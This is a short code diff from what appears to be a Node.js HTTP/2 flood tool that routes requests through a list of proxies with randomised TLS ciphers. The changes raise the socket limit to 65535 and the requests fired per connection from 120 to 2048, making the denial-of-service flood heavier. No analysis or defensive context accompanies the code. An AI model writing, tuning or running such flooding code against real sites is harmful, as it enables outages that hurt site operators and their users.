@@ -76,7 +76,7 @@ function cipher() {
     return cplist[Math.floor(Math.random() * cplist.length)];
 }
 
-proxys = fs.readFileSync("utils/http.txt", 'utf-8').toString().match(/\S+/g);
+proxys = fs.readFileSync("proxy.txt", 'utf-8').toString().match(/\S+/g);
 function proxyr() {
     return proxys[Math.floor(Math.random() * proxys.length)];
 }
@@ -109,7 +109,7 @@ const dateObj = new Date();
         const agent = new http.Agent({
             keepAlive: true,
             keepAliveMsecs: 10000,
-            maxSockets: 0,
+            maxSockets: 65535,
         });
         var req = http.request({
             host: proxy[0],
@@ -139,7 +139,7 @@ const dateObj = new Date();
                     ALPNProtocols: ['h2'],
                     socket: socket
                 }, function () {
-                    for (let i = 0; i< 120; i++){
+                    for (let i = 0; i< 2048; i++){
                         const req = client.request(header);
                         req.setEncoding('utf8');
                         req.on('data', (chunk) => {
